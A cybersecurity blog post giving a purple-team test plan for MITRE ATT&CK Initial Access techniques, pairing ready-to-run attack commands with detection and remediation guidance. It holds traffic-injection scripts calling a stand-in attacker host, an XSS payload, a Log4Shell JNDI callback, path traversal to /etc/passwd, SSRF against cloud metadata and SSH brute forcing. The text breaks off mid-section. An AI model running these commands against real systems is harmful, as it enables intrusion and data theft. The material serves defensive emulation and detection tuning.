---
title: MITRE ATTACK Initial Access: Hands-On Purple Team Test Plan
url: https://www.hackingdream.net/2025/06/mitre-attack-initial-access-hands-on-purple-team-test-plan.html
source: Hacking Dream
date: 2025-06-13
fetch_date: 2025-10-06T22:53:27.186186
---

# MITRE ATTACK Initial Access: Hands-On Purple Team Test Plan

* [Home](http://www.hackingdream.net)
* [About Author](http://www.hackingdream.net/p/about-author.html)
* [Contact US](http://www.hackingdream.net/p/contact-us.html)

[# ![Hacking Dream](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3MZul9awsB7xmLlAs9J9xDOsiYxbMQoa4EQkvg9T9oe4q5zkZRqV0W4UN2KhrQQWPLveTvQ9kkuHu2HfrahqY0Gc53G1cVCwQNY2G3MVkEOJoDvLIK9lFtBUc-HhRciiteWdHYV4SaE/s1600/Size-Modified.png)](https://www.hackingdream.net/)

Main menu

close

* [Home](http://www.hackingdream.net)
* [AI Sec](https://www.hackingdream.net/search/label/AI)
* [AI Pentest](http://www.hackingdream.net/search/label/AI%20Attacks)
* [Cheatsheets](https://www.hackingdream.net/search/label/Cheatsheet)
* [Pentest](https://www.hackingdream.net/search/label/Pentest)
* [\_Active Directory](https://www.hackingdream.net/search/label/Active%20Directory)
* [\_Linux](http://www.hackingdream.net/search/label/Kali%20Linux)
* [\_Wireless](http://www.hackingdream.net/search/label/Wifi%20Hacking)
* [\_Target Hacking](http://www.hackingdream.net/search/label/Target%20Hacking)
* [Purple Team](https://www.hackingdream.net/search/label/Purple%20Team)
* [Bin Exp](https://www.hackingdream.net/search/label/Exploitation)
* How To
* [\_Blogging](http://www.hackingdream.net/search/label/Blogging)
* [\_Solved Problems](http://www.hackingdream.net/search/label/Solved%20Problems)
* [\_Money Making](http://www.hackingdream.net/search/label/Money%20Making)
* [\_Top Ten](http://www.hackingdream.net/search/label/Top%20Ten)
* [\_Gaming](http://www.hackingdream.net/search/label/Games)

### MITRE ATTACK Initial Access: Hands-On Purple Team Test Plan

[June 12, 2025](https://www.hackingdream.net/2025/06/mitre-attack-initial-access-hands-on-purple-team-test-plan.html "permanent link")

MITRE ATTACK Initial Access: Hands-On Caldera Test Plan

# MITRE ATT&CK Initial Access: Hands-On Caldera Test Plan

*Updated on 12 June 2025*

This post details every **MITRE ATT&CK Initial Access** (TA0001) technique, supplying ready-to-run Caldera commands, blue-team detection analytics, and remediation guidance. Use it to verify coverage in your SOC, strengthen EDR, AV, and SIEM rules, and sharpen threat-hunting skills.

External reference: [MITRE ATT&CK TA0001](https://attack.mitre.org/tactics/TA0001/). See also CISA’s [latest advisories](https://www.cisa.gov/news-events) for real-world Initial-Access exploits.

|  |
| --- |
| [![MITRE ATTACK Initial Access: Hands-On Purple Team Test Plan](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjR67f0PyY3-1Jf_tAybYe-kdRjLgtvEe1fv5pppRuegO1P0MjReSCk0qjsflQM02jf97Ua903u5PRai6EcPR-Co4_Hy4NxyRId6Lq03fIC8GDrGQ6k1hWordJSejKJvKR2vplyDJPT09UGn7qXsMpyCF0PGa8y74DtUdqIcz0NkbzHrS2af9tAs6TBlamJ/w640-h426/MITRE-ATTACK-Initial-Access.jpg "MITRE ATTACK Initial Access: Hands-On Purple Team Test Plan")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjR67f0PyY3-1Jf_tAybYe-kdRjLgtvEe1fv5pppRuegO1P0MjReSCk0qjsflQM02jf97Ua903u5PRai6EcPR-Co4_Hy4NxyRId6Lq03fIC8GDrGQ6k1hWordJSejKJvKR2vplyDJPT09UGn7qXsMpyCF0PGa8y74DtUdqIcz0NkbzHrS2af9tAs6TBlamJ/s1024/MITRE-ATTACK-Initial-Access.jpg) |
| MITRE ATTACK Initial Access: Hands-On Purple Team Test Plan |

## Initial Access (TA0001) Hands-On Test Plan

**Goal:** Emulate each Initial Access tactic on a Linux host protected by security tooling, collect telemetry, and tune detections until coverage is complete.

---

### T1659 – Content Injection

#### Commands

```
# Transparent MITM that appends a tracking <img>
mitmproxy --mode transparent --listen-host {{iface}} \
          --script 'python:import mitmproxy.http as h; \
                     def response(flow:h.HTTPFlow): \
                         flow.response.text+="<img src=http://{{attacker_ip}}/x>"'

# Scapy one-liner: replace </body> with malicious <script>
sudo python3 - <<'PY'
from scapy.all import *
def inj(p):
  if p.haslayer(Raw) and b'</body>' in p[Raw].load:
    p[Raw].load=p[Raw].load.replace(b'</body>',b'<script src=http://{{attacker_ip}}/p.js></script></body>')
    sendp(p,iface="{{iface}}",verbose=0)
sniff(iface="{{iface}}",filter="tcp port 80",prn=inj,store=0)
PY

# iptables + nfqueue live string replace
iptables -t mangle -A PREROUTING -p tcp --dport 80 -j NFQUEUE --queue-num 9
nfqsed -n 9 -p 's|</head>|<iframe src=http://{{attacker_ip}}></iframe></head>|g'
```

#### Description

Injects malicious markup or JavaScript into in-transit web traffic, granting code-execution in the victim browser without redirecting them elsewhere.

#### Detection Guidance

* **EDR/AV** – flag `mitmproxy`, `scapy`, or `nfqsed` launched by non-root users or spawning shells.
* **Network/SIEM** – duplicate ARP replies, sudden HTTP response-size deltas, or `<script src=` strings in proxy logs.
* **Host logs** – `NETFILTER_CFG` audit events indicating live `iptables` edits.

#### Remediation Guidance

* Mandate TLS + HSTS.
* Set strict Content-Security-Policy (CSP) headers.
* Use Dynamic ARP Inspection and DHCP-Snooping to block rogue L2 devices.

### T1189 – Drive-by Compromise

#### Commands

```
# Launch an exploit kit in Docker
docker run -d --name exploitkit -p 8080:80 rodsploit/angler-elk

# Watering-hole payload server
python3 -m http.server 8081 --directory ./payloads

# Reflected XSS injection into vulnerable CMS
curl -X POST -d 'comment=<script src="http://{{attacker_ip}}:8081/a.js"></script>' \
     http://{{target}}/blog?id=1

# Simulated victim browsing
chromium --headless http://{{target}}/compromise.html
```

#### Description

The victim merely visits a poisoned site; the browser is exploited and malware downloads transparently.

#### Detection Guidance

* **EDR/AV** – browser spawning `shell`, `curl`, or `wget`.
* **Web proxy/DNS** – first-seen domain followed immediately by binary download.
* **SIEM** – rule: `(category=web AND http_status=200) THEN child_process=cmd.exe within 30 s`.

#### Remediation Guidance

* Patch browsers and plug-ins; enable exploit mitigations.
* Deploy ad-blocking/anti-tracking lists on secure DNS or SWG.
* Use browser isolation for high-risk users.

### T1190 – Exploit Public-Facing Application

#### Commands

```
# Path traversal probe
curl -k -X POST "https://{{target}}/wp-admin/admin-ajax.php" \
     -F 'action=revslider_show_image&img=../../../../../../etc/passwd'

# Log4Shell callback to a sinkhole
curl -H 'User-Agent: ${jndi:ldap://{{attacker_ip}}/a}' https://{{target}}/login

# SQL Injection enumeration
sqlmap -u "https://{{target}}/search.php?q=test" --batch --current-user

# SSRF request to instance metadata
curl -d 'url=http://169.254.169.254/latest/meta-data/' https://{{target}}/preview
```

#### Description

Abuses bugs or misconfigurations in Internet-exposed services to gain foothold.

#### Detection Guidance

* **WAF/NGFW** – signatures for `../`, `${jndi:`, or SQL keywords in query strings.
* **EDR/AV** – web-server processes spawning shells or network utilities.
* **SIEM** – HTTP 4xx/5xx spike followed by new outbound connection from server within 30 s.

#### Remediation Guidance

* Virtual-patch via WAF rules.
* Run web services with least privilege; restrict outbound traffic.
* Automated dependency scanning and rapid patch pipelines.

### T1133 – External Remote Services

#### Commands

```
# SSH brute force
hydra -V -L users.txt -P passwords.txt ssh://{{target}}

# VPN login using procured credentials
echo '{{password}}' | openconnect --user {{user}} vpn.corp.local --passwd-on-stdin

# Connect to exposed VNC
ncat --ssl {{target}} 5900

# RDP from Linux
xfreerdp /v:{{windows_host}} /u:{{domain}}\{{user}} /p:'{{pass}}'
```

#### Description

Leverages legitimate remote-access protocols (VPN, SSH, RDP, VNC) reachable from the Internet.

#### Detection Guidance

* **EDR/AV** – geo-anomaly on authentication events or unexpected `openconnect` inside container.
* **Auth logs** – bursts of failures followed by success.
* **SIEM** – rule: successful VPN logon from ASN not in allow-list + `(device_type != corporate)`.

#### Remedia...